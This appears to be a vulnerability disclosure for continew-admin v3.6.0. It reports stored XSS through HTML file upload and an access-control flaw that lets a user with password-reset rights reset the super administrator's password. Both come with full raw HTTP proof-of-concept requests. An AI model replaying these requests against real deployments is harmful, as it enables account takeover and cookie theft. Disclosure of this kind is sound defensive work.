BUG_Author

Longlong Gong

# Project

Address: [continew-admin](https://gitee.com/continew/continew-admin)

## 1、Stored cross-site scripting

###  1.1、`/dev-api/common/file` XSS-HTML

[Affected version]

v3.6.0



[Affected Component]

/dev-api/common/file



[Software]

https://gitee.com/continew/continew-admin/archive/refs/tags/v3.6.0.zip



[Description]

The continuous admin system v3.6.0 can upload HTML files when uploading files through the "/dev api/common/file" interface, causing storage XSS. Hackers can exploit this vulnerability to steal administrator cookies, conduct phishing attacks, and cause harm

POC

```
POST /dev-api/common/file HTTP/1.1
Host: 192.168.0.102:5173
Content-Length: 206
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpblR5cGUiOiJsb2dpbiIsImxvZ2luSWQiOjEsInJuU3RyIjoiWVlnMHRtREVIcWVlRUVSYUxIeEFQQXk2cUU5Snd3UXciLCJpcCI6IjA6MDowOjA6MDowOjA6MSIsImFkZHJlc3MiOiLlhoXnvZFJUCIsImJyb3dzZXIiOiJDaHJvbWUgMTM1LjAuMC4wIiwib3MiOiJXaW5kb3dzIDEwIiwibG9naW5UaW1lIjoxNzQ1OTc5OTUzfQ.vE2YecgyRq9CO98zBJtX0Klrqg-5P-gF1ngLMl9FYyI
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5qOjXMWh4FsI2Wkp
Origin: http://192.168.0.102:5173
Referer: http://192.168.0.102:5173/system/file
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_be968d539e394cf45975b5117965eb10=1745979934; HMACCOUNT=A206C719C9C02C2F; Hm_lpvt_be968d539e394cf45975b5117965eb10=1745979945
Connection: keep-alive

------WebKitFormBoundary5qOjXMWh4FsI2Wkp
Content-Disposition: form-data; name="file"; filename="xss.html"
Content-Type: text/html

<script>alert(1)</script>
------WebKitFormBoundary5qOjXMWh4FsI2Wkp--

```

Go to System Management ->File Management ->Upload, upload xsspayload in HTML format

![image-20250430110819252](assets/image-20250430110819252.png)

Obtain the return path

![image-20250430110928083](assets/image-20250430110928083.png)

Accessing can reveal the composition of storage XSS

![image-20250430110959248](assets/image-20250430110959248.png)

## 2、Logical loopholes

###  2.1、`/dev-api/system/user/1/password` Only assigning password reset permission can reset the super administrator password

[Affected version]

v3.6.0



[Affected Component]

/dev-api/system/user/1/password



[Software]

https://gitee.com/continew/continew-admin/archive/refs/tags/v3.6.0.zip



[Description]

The continue admin system v3.6.0 can reset the super administrator password through the "/dev api/system/user/1/password" interface to control the entire website

POC

```
PATCH /dev-api/system/user/1/password HTTP/1.1
Host: 192.168.0.102:5173
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpblR5cGUiOiJsb2dpbiIsImxvZ2luSWQiOjU0Nzg4OTI5Mzk2ODgwMTgyMiwicm5TdHIiOiJhNURzcHptdGdqYUxHNFlQQXh5ckRNbFlGMnFmQmxGdCIsImlwIjoiMDowOjA6MDowOjA6MDoxIiwiYWRkcmVzcyI6IuWGhee9kUlQIiwiYnJvd3NlciI6IkZpcmVmb3ggMTM4LjAiLCJvcyI6IldpbmRvd3MgMTAiLCJsb2dpblRpbWUiOjE3NDU5ODQwMzJ9.XB3lVAbbWCaVMr2w7cNSTZ5V6CJVTflI6ad8yYdFCj8
Content-Length: 106
Origin: http://192.168.0.102:5173
Connection: keep-alive
Referer: http://192.168.0.102:5173/system/user
Cookie: Hm_lvt_be968d539e394cf45975b5117965eb10=1745983968; Hm_lpvt_be968d539e394cf45975b5117965eb10=1745983968; HMACCOUNT=CC4CA866A8DF457A
Priority: u=0

{"newPassword":"c4jYYXlQYZdamxR0k6rO3sML/geGIG6YX3u+TMydQvR9PhtOvAahznoV6VcPkRyMKwP1VbF8JeLx2+1cg0Kisg=="}
```

Firstly, assign the function of resetting passwords to testers

![image-20250430114433377](assets/image-20250430114433377.png)

Log in to the tester account and choose to reset your password

![image-20250430114535866](assets/image-20250430114535866.png)

The data packet is as follows

![image-20250430114624015](assets/image-20250430114624015.png)

By changing the user's own ID to 1, which is the super administrator's ID, the administrator password can be successfully changed

![image-20250430114711751](assets/image-20250430114711751.png)
